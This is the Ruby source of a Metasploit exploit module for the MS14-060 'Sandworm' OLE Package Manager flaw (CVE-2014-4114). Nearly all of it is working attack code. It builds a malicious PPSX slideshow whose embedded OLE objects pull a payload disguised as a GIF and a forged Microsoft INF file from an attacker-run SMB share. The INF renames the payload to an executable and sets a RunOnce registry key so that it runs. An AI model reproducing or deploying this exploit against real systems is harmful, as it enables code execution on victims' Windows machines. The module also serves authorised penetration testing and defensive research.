##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS14-060 Microsoft Windows OLE Package Manager Code Execution",
      'Description'    => %q{
        This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE)
        allowing arbitrary code execution, publicly known as "Sandworm". Platforms such as Windows
        Vista SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known to be
        vulnerable. However, based on our testing, the most reliable setup is on Windows platforms
        running Office 2013 and Office 2010 SP2. And please keep in mind that some other setups such
        as using Office 2010 SP1 might be less stable, and sometimes may end up with a crash due to
        a failure in the CPackage::CreateTempFileName function.

        This module will generate three files: an INF, a GIF, and a PPSX file. You are required to
        set up a SMB or Samba 3 server and host the INF and GIF there. Systems such as Ubuntu or an
        older version of Winodws (such as XP) work best for this because they require little
        configuration to get going. The PPSX file is what you should send to your target.

        In detail, the vulnerability has to do with how the Object Packager 2 component
        (packager.dll) handles an INF file that contains malicious registry changes, which may be
        leveraged for code execution. First of all, Packager does not load the INF file directly.
        But as an attacker, you can trick it to load your INF anyway by embedding the file path as
        a remote share in an OLE object. The packager will then treat it as a type of media file,
        and load it with the packager!CPackage::OLE2MPlayerReadFromStream function, which will
        download it with a CopyFileW call, save it in a temp folder, and pass that information for
        later. The exploit will do this loading process twice: first for a fake gif file that's
        actually the payload, and the second for the INF file.

        The packager will also look at each OLE object's XML Presentation Command, specifically the
        type and cmd property. In the exploit, "verb" media command type is used, and this triggers
        the packager!CPackage::DoVerb function. Also, "-3" is used as the fake gif file's cmd
        property, and "3" is used for the INF. When the cmd is "-3", DoVerb will bail. But when "3"
        is used (again, for the INF file), it will cause the packager to try to find appropriate
        handler for it, which will end up with C:\Windows\System32\infDefaultInstall.exe, and that
        will install/run the malicious INF file, and finally give us arbitrary code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown', # Vulnerability discovery
          'sinn3r', # Metasploit module
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2014-4114'],
          ['OSVDB', '113140'],
          ['MSB', 'MS14-060'],
          ['BID', '70419'],
          ['URL' , 'http://www.isightpartners.com/2014/10/cve-2014-4114/'],
          ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-windows-zero-day-vulnerability-cve-2014-4114-aka-sandworm/'],
          ['URL', 'http://blog.vulnhunt.com/index.php/2014/10/14/cve-2014-4114_sandworm-apt-windows-ole-package-inf-arbitrary-code-execution/']
        ],
      'Payload'        =>
        {
          'Space'       => 2048,
          'DisableNops' => true
        },
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Targets'        =>
        [
          ['Windows 7 SP1 / Office 2010 SP2 / Office 2013', {}],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Oct 14 2014",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [true, 'The PPSX file', 'msf.ppsx']),
        OptString.new('UNCPATH', [ true, 'The UNC folder to use (Ex: \\\\192.168.1.1\\share)' ])
      ], self.class)
  end

  def exploit
    @unc = validate_unc_path

    if @unc.nil?
      fail_with(Failure::BadConfig, "UNCPATH must be a remote shared folder")
    end

    print_status("Creating the EXE payload...")
    payload_name = "#{rand_text_alpha(4)}.gif"
    p = generate_payload_exe

    print_status("Creating the INF file...")
    inf_name = "#{rand_text_alpha(4)}.inf"
    inf = inf_file(payload_name)

    print_status("Creating '#{datastore['FILENAME']}' file ...")
    exe_stream = ole_exe(payload_name)
    inf_stream = ole_inf(inf_name)
    zip = zip_ppsx(exe_stream, inf_stream)
    file_create(zip)

    payload_path = my_file_create(p, payload_name)
    print_good("#{payload_name} stored at #{payload_path}, copy it to the remote share: #{@unc}")

    inf_path = my_file_create(inf, inf_name)
    print_good("#{inf_name} stored at #{inf_path}, copy it to the remote share: #{@unc}")
  end

  def validate_unc_path
    if datastore['UNCPATH'] =~ /^\\{2}[[:print:]]+\\[[:print:]]+\\*$/
      unc = datastore['UNCPATH']
    else
      unc = nil
    end

    unc
  end

  def my_file_create(data, name)
    ltype = "exploit.fileformat.#{self.shortname}"
    path = store_local(ltype, nil, data, name)

    path
  end

  def zip_ppsx(ole_exe, ole_inf)
    zip_data = {}
    data_dir = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-4114', 'template')

    Dir["#{data_dir}/**/**"].each do |file|
      unless File.directory?(file)
        zip_data[file.sub(data_dir,'')] = File.read(file)
      end
    end

    # add the otherwise skipped "hidden" file
    file = "#{data_dir}/_rels/.rels"
    zip_data[file.sub(data_dir,'')] = File.read(file)

    # put our own OLE streams
    zip_data['/ppt/embeddings/oleObject1.bin'] = ole_exe
    zip_data['/ppt/embeddings/oleObject2.bin'] = ole_inf

    # create the ppsx
    ppsx = Rex::Zip::Archive.new
    zip_data.each_pair do |k,v|
      ppsx.add_file(k,v)
    end

    ppsx.pack
  end

  def ole_inf(file_name)
    content = "EmbeddedStg2.txt\x00"
    content << "#{@unc}\\#{file_name}\x00"

    data = [content.length].pack('V')
    data << content
    ole = create_ole("\x01OLE10Native", data)

    ole
  end

  def ole_exe(file_name)
    content = "EmbeddedStg1.txt\x00"
    content << "#{@unc}\\#{file_name}\x00"

    data = [content.length].pack('V')
    data << content

    ole = create_ole("\x01OLE10Native", data)

    ole
  end

  def create_ole(stream_name, data)
    ole_tmp = Rex::Quickfile.new('ole')
    stg = Rex::OLE::Storage.new(ole_tmp.path, Rex::OLE::STGM_WRITE)

    stm = stg.create_stream(stream_name)
    stm << data
    stm.close

    directory = stg.instance_variable_get(:@directory)
    directory.each_entry do |entry|
      if entry.instance_variable_get(:@_ab) == 'Root Entry'
        # 02260200-0000-0000-c000-000000000046 # Video clip
        clsid = Rex::OLE::CLSID.new("\x02\x26\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46")
        entry.instance_variable_set(:@_clsId, clsid)
      end
    end

    # write to disk
    stg.close

    ole_contents = File.read(ole_tmp.path)
    ole_tmp.close
    ole_tmp.unlink

    ole_contents
  end

  def inf_file(gif_name)
    inf = <<-EOF
; 61883.INF
; Copyright (c) Microsoft Corporation.  All rights reserved.

[Version]
Signature = "$CHICAGO$"
Class=61883
ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17}
Provider=%Msft%
DriverVer=06/21/2006,6.1.7600.16385

[DestinationDirs]
DefaultDestDir = 1

[DefaultInstall]
RenFiles = RxRename
AddReg = RxStart

[RxRename]
#{gif_name}.exe, #{gif_name}
[RxStart]#
HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,%1%\\#{gif_name}.exe
EOF

    inf
  end

end
